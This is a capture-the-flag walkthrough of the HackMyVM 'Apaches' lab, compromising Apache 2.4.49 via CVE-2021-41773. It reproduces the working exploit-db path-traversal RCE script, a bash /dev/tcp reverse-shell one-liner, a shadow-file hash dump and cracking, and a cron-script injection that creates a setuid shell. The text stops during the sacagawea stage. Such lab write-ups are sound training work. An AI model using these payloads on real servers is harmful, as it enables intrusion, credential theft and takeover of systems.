# Apaches

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Apaches | eMVee | Beginner | HackMyVM |

**Summary:** This machine demonstrates a critical vulnerability chain in Apache HTTP Server 2.4.49 (CVE-2021-41773), a path traversal and remote code execution vulnerability that allows arbitrary command execution through the CGI module. Starting with remote code execution as the daemon user, the attacker extracts password hashes from the shadow file and cracks them using John the Ripper. Through a combination of group-based file permissions, cron job manipulation, hardcoded credentials discovered in source code, and misconfigured sudo privileges, the attacker achieves lateral movement across multiple user accounts. The exploitation chain culminates in privilege escalation through a nano text editor GTFOBins technique, ultimately leading to complete root compromise of the system.

---

## Network Scanning and Discovery

The engagement began with network host discovery to identify the target machine within the local network segment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.170 08:00:27:B2:79:A9 VirtualBox
```

A target host at 192.168.100.170 was identified and selected for testing. Environment variables were configured for ease of command execution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ ip=192.168.100.170 && url=http://$ip
```

---

## Service Enumeration

A comprehensive Nmap scan was performed against the target to identify open services and their versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 01:56 WIB
Nmap scan report for 192.168.100.170
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 bc:95:83:6e:c4:62:38:b5:a9:94:0c:14:a3:bf:57:34 (RSA)
|   256 07:fa:46:1a:ca:f3:dc:08:2f:72:8c:e2:f2:2e:32:e5 (ECDSA)
|_  256 46:ff:72:d5:67:c5:1f:87:b1:35:84:29:f3:ad:e8:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Apaches
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at 1 IP address (1 host up) scanned in 52.48 seconds
```

The scan identified Apache httpd 2.4.49 running on port 80 and OpenSSH 8.2p1 on port 22. The robots.txt file was noted by Nmap as containing one disallowed entry.

---

## Web Reconnaissance

The robots.txt file was retrieved and examined for information disclosure.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ curl -s $url/robots.txt
User-agent: *
Disallow: /

# IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg
```

The file contained a base64-encoded comment that was decoded to reveal a thematic message about following one's path, with a reference to Pocahontas.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ echo 'IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg' | base64 -d
 "You know your path, child, now follow it."
-- Pocahontas  
```

The main web page was accessed and displayed the Apache server's landing page:

![](image.png)

---

## Vulnerability Assessment

SearchSploit was used to identify known vulnerabilities affecting Apache 2.4.49.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ searchsploit apache 2.4.49
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                      | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                    | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                  | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                             | multiple/webapps/50383.sh
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                 | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                           | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                           | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                  | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                    | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                  | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                            | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execu | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execu | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                         | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Remote Code Execution                                            | linux/remote/34.pl
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The primary vulnerability of interest is CVE-2021-41773: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution. The exploit script was retrieved.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ searchsploit -m multiple/webapps/50383.sh
  Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50383
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50383.sh
    Codes: CVE-2021-41773
 Verified: True
File Type: ASCII text
Copied to: /tmp/apaches/50383.sh
```

The exploit script was examined to understand its operation.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ cat 50383.sh
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

The script expects a target file, a path to traverse to, and a command to execute. Initial testing was performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ bash 50383.sh
Set [TAGET-LIST.TXT] [PATH] [COMMAND]
./PoC.sh targets.txt /etc/passwd
```

---

## Initial Exploitation

A targets file was created containing the target IP address.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ echo $ip > targets.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ cat targets.txt
192.168.100.170
```

The first exploitation attempt tried to read the /etc/passwd file directly, which resulted in an HTTP 500 Internal Server Error.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ bash 50383.sh targets.txt /etc/passwd
192.168.100.170
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at
 you@example.com to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
</body></html>
```

A simplified test using the id command proved more successful.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ bash 50383.sh targets.txt /bin/sh "id"
192.168.100.170
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Remote code execution was confirmed with the daemon user. A reverse shell was established by setting up a netcat listener:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell payload was executed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ bash 50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'"
192.168.100.170
```

The connection was successfully established:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 60853
bash: cannot set terminal process group (831): Inappropriate ioctl for device
bash: no job control in this shell
daemon@apaches:/usr/bin$ which python3
which python3
/usr/bin/python3
daemon@apaches:/usr/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@apaches:/usr/bin$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

daemon@apaches:/usr/bin$ export SHELL=/bin/bash
daemon@apaches:/usr/bin$ export TERM=xterm
daemon@apaches:/usr/bin$ stty rows 81 cols 179
```

---

## System Enumeration

With remote shell access established, the system was thoroughly enumerated to identify users, permissions, and potential privilege escalation vectors.

Users with shell access were identified:

```bash
daemon@apaches:/usr/bin$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
geronimo:x:1000:1000:geronimo:/home/geronimo:/bin/bash
squanto:x:1001:1001:,,,:/home/squanto:/bin/bash
sacagawea:x:1002:1002:,,,:/home/sacagawea:/bin/bash
pocahontas:x:1003:1003:,,,:/home/pocahontas:/bin/bash
```

The home directories were examined:

```bash
daemon@apaches:/usr/bin$ ls -la /home
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/usr/bin$ ls -la /home/*
/home/geronimo:
total 32
drwxr-xr-x 4 geronimo geronimo 4096 Jul 13  2023 .
drwxr-xr-x 6 root     root     4096 Oct  9  2022 ..
-rw------- 1 geronimo geronimo    0 Jul 13  2023 .bash_history
-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc
drwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache
drwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local
-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile
-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful
-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt

/home/pocahontas:
total 36
drwxr-xr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .
drwxr-xr-x 6 root       root        4096 Oct  9  2022 ..
-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history
-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local
-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile
-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt

/home/sacagawea:
total 48
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 .
drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
drwxrwxr-x 2 sacagawea sacagawea 4096 Apr 13 19:20 Backup
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt

/home/squanto:
total 36
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 6 root    root    4096 Oct  9  2022 ..
-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 squanto squanto  220 Oct 10  2022 .bash_logout
-rw-r--r-- 1 squanto squanto 3771 Oct 10  2022 .bashrc
drwxrwxr-x 3 squanto squanto 4096 Oct 10  2022 .local
-rw-r--r-- 1 squanto squanto  807 Oct 10  2022 .profile
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup
-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md
-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt
```

---

## Password Hash Extraction

The shadow file was examined for password hashes:

```bash
daemon@apaches:/tmp$ ls -la /etc/shadow
-rw-r--r-- 1 root shadow 1434 Oct 10  2022 /etc/shadow
daemon@apaches:/tmp$ cat /etc/shadow
root:*:18375:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:19265:0:99999:7:::
systemd-coredump:!!:19265::::::
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:!:19265::::::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::
```

The complete passwd file was also captured:

```bash
daemon@apaches:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
geronimo:x:1000:1000:geronimo:/home/geronimo:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
squanto:x:1001:1001:,,,:/home/squanto:/bin/bash
sacagawea:x:1002:1002:,,,:/home/sacagawea:/bin/bash
pocahontas:x:1003:1003:,,,:/home/pocahontas:/bin/bash
```

---

## Offline Password Cracking

The passwd and shadow files were prepared for offline password cracking using the unshadow utility and then John the Ripper:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ vim passwd

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ vim shadow

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ unshadow passwd shadow > unshadowed.txt
```

John the Ripper was executed with the rockyou.txt wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ john -w=/usr/share/wordlists/rockyou.txt unshadowed.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamtheone        (squanto)
```

The password for the squanto user was successfully recovered as "iamtheone".

---

## Lateral Movement to Squanto

The su command was used to authenticate as the squanto user:

```bash
daemon@apaches:/tmp$ su - squanto
Password:
squanto@apaches:~$ id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
squanto@apaches:~$ sudo -l
[sudo] password for squanto:
Sorry, user squanto may not run sudo on apaches.
squanto@apaches:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

#* 5 * * * * su sacagawea -c "./home/sacagawea/Scripts/backup.sh"
```

The squanto user's flag was immediately accessible:

```bash
squanto@apaches:~$ cat user.txt
  ______ _                      __                               _
 |  ____| |                    / _|                             | |
 | |__  | | __ _  __ _    ___ | |_   ___  __ _ _   _  __ _ _ __ | |_ ___
 |  __| | |/ _` |/ _` |  / _ \|  _| / __|/ _` | | | |/ _` | '_ \| __/ _ \
 | |    | | (_| | (_| | | (_) | |   \__ \ (_| | |_| | (_| | | | | || (_) |
 |_|    |_|\__,_|\__, |  \___/|_|   |___\__, |\__,_|\__,_|_| |_|\__\___/
                   __/ |                     | |
                  |___/                      |_|
@@@@@@@@&@&@@&&@&&&&&&&&&&&&&&&&&&&&&&&&%&%#%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@&@&@&@&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&#%%%%&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#(%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@&&&@&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&#((#%#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@&@&&&&&&&&&&&&&&&&&&&&&&&%((//..(*,/,,*.%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@&@@&&&&&&&&&&&&&&&&&&&&&&&##%#(/&&&&&%#//,    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&&&&&&&&&&&&&&&&&&((((*&&&%&%%#%((/((  ./&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&@&&&&&&&&&&&&&&&&%(((//&&&&&#/#(/*//(/(  ..&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&&&&&&&&&&&&&&&&#(//%%&&*../%(,.*. .(/(  ..&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&&&&&&&@&&&&&&&&&&//*(&&%%#/#%&&//**(//(//  .&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@&@&&&&&&&&&&(,,*&@&&&&&%%&&(/,((((//(   /&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&&&&&&&&&&&&&&&&&(.  ##%&&/&&(#*,. /,/////   &&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@&&&&&&&&&&&&&&&&&,  %##%%&&&/**.,**//(///,#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&&@&&&&&&&&&&&&&&(,/%%%&&&&&%((**//*/(/  /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@&&@@@&@&&&&&&&&&&&&%*,.#%#&&&#*////**.     .%&&&&&&&&&&&&&&&&&&&@&&&&&
@@@@@@@@@@@&@&@&@&&&&&&&&&&%#&** /%#/*,(..,..       ...*&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&@@@&@@&&&&&&&&@@&#/.**%&%##(*,.    ..   .,//&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&@&@&@&@@&&@@&&@&&&%( %%(&%&%#((%%**@*,.,.,,//,&&&&&&@&&@&&&&&&&&&&&&&&

Well done!
squanto@apaches:~$ id sacagawea
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

---

## Cron Job Exploitation for Sacagawea Access

The squanto user was found to be a member of the Lipan group, which has write permissions on sacagawea's backup script. The backup script was examined:

```bash
squanto@apaches:~$ cd /home/sacagawea
squanto@apaches:/home/sacagawea$ cat ./Scripts/backup.sh
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz

squanto@apaches:/home/sacagawea$ ls -la Scripts/backup.sh
-rwxrwx--- 1 sacagawea Lipan 182 Oct 10  2022 Scripts/backup.sh
```

A malicious command was appended to the script to create a setuid bash binary:

```bash
squanto@apaches:/home/sacagawea$ echo "cp /bin/bash /tmp/sacabash && chmod +s /tmp/sacabash" >> /home/sacagawea/Scripts/backup.sh
squanto@apaches:/home/sacagawea$ ls -la /tmp/sacabash
ls: cannot access '/tmp/sacabash': No such file or directory
squanto@apaches:/home/sacagawea$ ls -la /tmp
total 1204
drwxrwxrwt 12 root      root         4096 Apr 13 19:52 .
drwxr-xr-x 20 root      root         4096 Sep 30  2022 ..
drwxrwxrwt  2 root      root         4096 Apr 13 18:49 .font-unix
drwxrwxrwt  2 root      root         4096 Apr 13 18:49 .ICE-unix
-rwsr-sr-x  1 sacagawea sacagawea 1183448 Apr 13 19:52 sacabash
drwx------  3 root      root         4096 Apr 13 18:49 snap-private-tmp
drwx------  3 root      root         4096 Apr 13 19:32 systemd-private-5db7d9eef017482286704ec082fed288-fwupd.service-C1OHXi
drwx------  3 root      root         4096 Apr 13 18:49 systemd-private-5db7d9eef017482286704ec082fed288-systemd-logind.service-Cp70Sf
drwx------  3 root      root         4096 Apr 13 18:49 systemd-private-5db7d9eef017482286704ec082fed288-systemd-resolved.service-1Pztii
drwxrwxrwt  2 root      root         4096 Apr 13 18:49 systemd-private-5db7d9eef017482286704ec082fed288-systemd-timesync.service-yKGtih
drwxrwxrwt  2 root      root         4096 Apr 13 18:49 .Test-unix
drwxrwxrwt  2 root      root         4096 Apr 13 18:49 .X11-unix
drwxrwxrwt  2 root      root         4096 Apr 13 18:49 .XIM-unix
squanto@apaches:/home/sacagawea$ /tmp/sacabash -p
sacabash-5.0$ id
uid=1001(squanto) gid=1001(squanto) euid=1002(sacagawea) egid=1002(sacagawea) groups=1002(sacagawea),1001(squanto),1004(Lipan)

sacabash-5.0$ cat /home/sacagawea/user.txt

                                                                                                                     
  _____ _                      __
 |  ___| | __ _  __ _    ___  / _|  ___  __ _  ___ __ _  __ _  __ ___      _____  __ _
 | |_  | |/ _` |/ _` |  / _ \| |_  / __|/ _` |/ __/ _` |/ _` |/ _` \ \ /\ / / _ \/ _` |
 |  _| | | (_| | (_| | | (_) |  _| \__ \ (_| | (_| (_| | (_| | (_| |\ V  V /  __/ (_| |
 |_|   |_|\__,_|\__, |  \___/|_|   |___\__,_|\___\__,_|\__, |\__,_| \_/\_/ \___|\__,_|
                 |___/                                   |___/




****(************************************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.*,,,,,,
**/*******************/****************.,.,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,,,,,,
***************************************.,%/*,,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,%,,,,,
//////////////////////***********************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/%,,,,
////////////////////////////****************,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(,,,
/////////((((((((((((((////(//////*************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,,
////(((((((((((((((((((((((((///////**********,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,
//((((((((((###########((((((((/////(*************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*,,
(((((((((####################(((((((/*,,,,,,,,//,,,,//,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(((((((((%########%###%######((((,,,,,,,,,,,*(/(,,,**/((/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
((((((########%%%%%%%%%%%%%###,,,,,,,,,,,,,,*((/,,,,*((((((*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
((((((########%%%%%%%%%%%%%%,,,,,,,,,,,,,,**/(//,,,,//(((/(//*,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(((((########%%%%%%%%%%%%%#,,,,,,,,,,,,,,,*((/**,,*///(((//*****,,,,*,,,,,*,,,,,,,,,,,,,,,
((((########%%%%%%%%%%%%%(,,,,,,,,,,,,,,*,****/((**//((///***,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(((#######%%%%%%%%%&&%%%%,,,,,,,,,,,**//(((#((##%#((((((/*,,,,,,,,,,,**,,,,,,,,,,,,,,,,,,,
##########%%%%%%%%%%&%%%,,,,,,,,,*,***((########%%%%%(/*/*(,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*
